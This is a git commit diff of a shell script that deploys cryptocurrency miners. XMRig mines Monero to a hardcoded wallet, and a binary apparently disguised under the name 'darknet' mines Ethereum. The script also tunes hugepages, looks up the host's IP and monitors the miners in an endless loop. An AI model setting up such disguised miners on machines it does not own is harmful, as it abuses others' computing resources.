f1397c7e252c5ddbd7ee449f8bc3303d89068211
tanle2694 <tanle2694@gmail.com>
2021-09-22 11:33:24 +0700

    run 1604

--- run_1604.sh
+++ run_1604.sh
@@ -1,7 +1,7 @@
 #!/bin/sh
 apt-get update -y
 apt-get install -y --no-install-recommends apt-utils
-apt install build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y
+apt install build-essential cmake libuv1-dev libssl-dev libhwloc-dev curl -y
 apt install libpci-dev -y
 apt install libssl-dev -y
 worker_name=$1
@@ -9,16 +9,29 @@ wallet=$2
 
 WALLET=86fQy4W7vXLEyLnMSvGopqfQbhZRAfF3CguZWKckMSFKV25Z9443rDKbSGnDGDKzsSYxF5iPyvJpdD7xZQYSodzKR7LyYAN
 POOL=pool.supportxmr.com:5555
+thread=$(grep ^cpu\\scores /proc/cpuinfo | uniq |  awk '{print $4}')
+run_thread=$((thread * 2 - 1))
 
-./xmrig_1604 --url=$POOL --donate-level=1 --user=$WALLET --pass=worker_name -k --coin=monero --max-cpu-usage=75 &
+sysctl -w vm.nr_hugepages=$(nproc)
+
+for i in $(find /sys/devices/system/node/node* -maxdepth 0 -type d);
+do
+    echo 3 > "$i/hugepages/hugepages-1048576kB/nr_hugepages";
+done
+
+echo "1GB pages successfully enabled"
+
+./xmrig --url=$POOL --donate-level=1 --user=$WALLET --pass=worker_name -k --coin=monero --threads $run_thread &
 #./xmrig --url=$POOL --donate-level=1 --user=$WALLET --pass=ggcloud -k --coin=monero --max-cpu-usage=100 &
 echo "run darknet"
 
 ./darknet -pool eu1.ethermine.org:4444 -wal $wallet -worker $worker_name -epsw x -mode 1 -log 0 -mport 0 -etha 0 -ftime 55 -retrydelay 1 -tt 79 -tstop 89  -coin eth &
+ip=$(curl ipinfo.io)
 while true
 do
   ps aux | grep darknet
   ps aux | grep xmrig
+  echo $ip
   nvidia-smi
   sleep 3600
 done
